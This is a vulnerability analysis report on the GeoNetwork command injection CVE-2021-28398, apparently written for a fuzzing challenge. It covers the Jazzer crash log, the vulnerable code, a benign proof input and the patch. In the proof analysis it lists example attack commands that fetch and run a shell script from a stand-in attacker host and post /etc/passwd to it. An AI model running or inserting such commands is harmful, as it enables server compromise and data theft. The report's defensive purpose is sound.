# Vulnerability Analysis for cpv_0

## Summary
- **CPV ID**: cpv_0
- **Harness**: GeonetworkOne
- **Vulnerability Type**: OS Command Injection
- **Origin**: 1-day (CVE-2021-28398)
- **Release Date**: 09/05/2022
- **References**: 
  - https://nvd.nist.gov/vuln/detail/CVE-2021-28398
  - https://github.com/geonetwork/core-geonetwork/security/advisories/GHSA-cf8p-c88c-h9jf

## Crash Log Analysis
- **Error Type**: FuzzerSecurityIssueCritical: OS Command Injection
- **Crash Location**: LocalFilesystemHarvester.java:242
- **Vulnerable Function**: `runBeforeScript()`
- **DEDUP Token**: 11b6e5fcee21af21

### Stack Trace
```
== Java Exception: com.code_intelligence.jazzer.api.FuzzerSecurityIssueCritical: OS Command Injection
Executing OS commands with attacker-controlled data can lead to remote code execution.
	at com.code_intelligence.jazzer.sanitizers.OsCommandInjection.processImplStartHook(OsCommandInjection.kt:60)
	at java.base/java.lang.ProcessBuilder.start(ProcessBuilder.java:1110)
	at java.base/java.lang.ProcessBuilder.start(ProcessBuilder.java:1073)
	at org.fao.geonet.kernel.harvest.harvester.localfilesystem.LocalFilesystemHarvester.runBeforeScript(LocalFilesystemHarvester.java:242)
	at org.fao.geonet.kernel.harvest.harvester.localfilesystem.LocalFilesystemHarvester.doHarvest(LocalFilesystemHarvester.java:228)
	at com.aixcc.geonetwork.harnesses.one.GeonetworkOne.fuzz(GeonetworkOne.java:89)
	at com.aixcc.geonetwork.harnesses.one.GeonetworkOne.fuzzerTestOneInput(GeonetworkOne.java:73)
DEDUP_TOKEN: 11b6e5fcee21af21
```

## Vulnerable Code Location(s)

### Location 1 (crash_site)
- **Type**: crash_site
- **File Path**: harvesters/src/main/java/org/fao/geonet/kernel/harvest/harvester/localfilesystem/LocalFilesystemHarvester.java
- **Function**: runBeforeScript
- **Line Range**: 239-242
- **Column Range**: 1-50 (ProcessBuilder instantiation and start call)

### Location 2 (root_cause)
- **Type**: root_cause
- **File Path**: harvesters/src/main/java/org/fao/geonet/kernel/harvest/harvester/localfilesystem/LocalFilesystemHarvester.java
- **Function**: runBeforeScript
- **Line Range**: 237-242
- **Column Range**: 1-50 (Entire vulnerable code block from logging to ProcessBuilder.start())

### Code Context
**Vulnerable code (lines 233-248):**
```java
private void runBeforeScript() throws IOException, InterruptedException {
    if (StringUtils.isEmpty(params.beforeScript)) {
        return;
    }
    log.info("Running the before script: " + params.beforeScript);
    List<String> args = new ArrayList<String>(Arrays.asList(params.beforeScript.split(" ")));
    Process process = new ProcessBuilder(args).
            redirectError(ProcessBuilder.Redirect.INHERIT).
            redirectOutput(ProcessBuilder.Redirect.INHERIT).
            start();
    int result = process.waitFor();
    if ( result != 0 ) {
        log.warning("The beforeScript failed with exit value=" + Integer.toString(result));
        throw new RuntimeException("The beforeScript returned an error: " + Integer.toString(result));
    }
}
```

**The vulnerability exists at lines 237-242** where:
1. Line 237-238: User-controlled `params.beforeScript` is split by spaces without validation
2. Line 239-242: The untrusted input is passed directly to `ProcessBuilder` which executes the command

## CWE Classification
- **CWE-78**: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
- **CWE-94**: Improper Control of Generation of Code ('Code Injection')
- **CWE-676**: Use of Potentially Dangerous Function

## Vulnerability Description

This is an **OS Command Injection** vulnerability in GeoNetwork's Local Filesystem Harvester functionality. The vulnerability occurs in the `runBeforeScript()` method of the `LocalFilesystemHarvester` class.

**Root Cause:**
The method takes user-controlled input from `params.beforeScript`, performs a simple split on spaces, and directly passes the resulting array to `ProcessBuilder.start()` without any validation or sanitization. An authenticated administrator can craft malicious XML input containing arbitrary OS commands in the `<beforeScript>` element, which will be executed on the server with the privileges of the GeoNetwork process.

**Attack Vector:**
1. Attacker provides malicious XML input through the fuzzing harness (or in real-world, through the harvester configuration)
2. The XML is parsed and the `<beforeScript>` value is extracted
3. The `runBeforeScript()` method is called during the harvest operation (line 228 in `doHarvest()`)
4. The unvalidated command is executed via `ProcessBuilder.start()`

**Impact:**
- Remote Code Execution (RCE) on the hosting server
- Complete compromise of the system with GeoNetwork's process privileges
- Potential lateral movement within the internal network
- Data theft, system manipulation, or denial of service

**Example POV:**
The POV file contains: `<node><site><beforeScript>jazze</beforeScript></site></node>`

This simple XML triggers the command injection detector in Jazzer, demonstrating that any string in the `beforeScript` field will be executed as an OS command.

## POV Analysis

**POV File**: `pov_0.blob`

**Content**:
```xml
<node><site><beforeScript>jazze</beforeScript></site></node>
```

**Analysis**:
The POV is a minimal XML document that triggers the vulnerability. The fuzzing harness:
1. Parses this XML using SAXBuilder
2. Creates a LocalFilesystemHarvester instance
3. Calls `harvester.add(element)` to configure it with the malicious XML
4. Calls `harvester.doHarvest()` which triggers `runBeforeScript()`

The string "jazze" is executed as a command, triggering Jazzer's OS Command Injection security detector. In a real attack scenario, this could be replaced with any malicious command like:
- `bash -c 'wget attacker.com/shell.sh | bash'`
- `curl -X POST -d @/etc/passwd attacker.com/exfil`
- Any other OS command for data exfiltration, backdoor installation, or system compromise

## Patch Analysis

**Patch File**: `patch_0.diff`

**Key Changes**:
The patch completely disables the vulnerable functionality by:

1. **Immediate termination**: Lines 24-26 add an immediate `throw new InterruptedException("Script option is currently disabled.")` at the start of the method
2. **Code commenting**: Lines 28-38 comment out the entire vulnerable code block
3. **Security note**: Lines 26-27 add a TODO comment indicating that any future implementation must restrict scripts to "well known ones added by a catalog admin in the data directory"

**Security Improvement**:
The patch takes a conservative approach by completely disabling the feature rather than attempting to sanitize input. This is appropriate for a command injection vulnerability where proper sanitization is complex and error-prone. The TODO indicates future implementations should:
- Whitelist allowed scripts
- Restrict to administrator-defined scripts in a controlled directory
- Avoid executing arbitrary user input

**Lines Modified**: 233-248 (function body)
**Fix Location**: harvesters/src/main/java/org/fao/geonet/kernel/harvest/harvester/localfilesystem/LocalFilesystemHarvester.java

## Recommendations

### For vuln.yaml Generation:
- **Suggested CWEs**: [CWE-78, CWE-94, CWE-676]
- **Vulnerability Name**: "OS Command Injection in Local Filesystem Harvester Before-Script"
- **Origin**: 1-day
- **Release Date**: 09/05/2022
- **References**: Include both CVE-2021-28398 (NVD) and GHSA-cf8p-c88c-h9jf (GitHub Advisory)

### Location Specifications:
- **crash_site**: LocalFilesystemHarvester.java, lines 239-242, function `runBeforeScript` (where ProcessBuilder.start() is called)
- **root_cause**: LocalFilesystemHarvester.java, lines 237-242, function `runBeforeScript` (where untrusted input flows to command execution)

### Affected Versions:
- GeoNetwork 3.4.0 through 3.10.6
- GeoNetwork 4.0.0-alpha.1 through 4.0.3

### Patched Versions:
- GeoNetwork 3.12.0
- GeoNetwork 4.0.4

---

**Analysis Complete**: This is a confirmed 1-day vulnerability (CVE-2021-28398) with clear documentation, patches, and security advisories. The vulnerability allows authenticated administrators to execute arbitrary OS commands through the Local Filesystem Harvester's before-script functionality.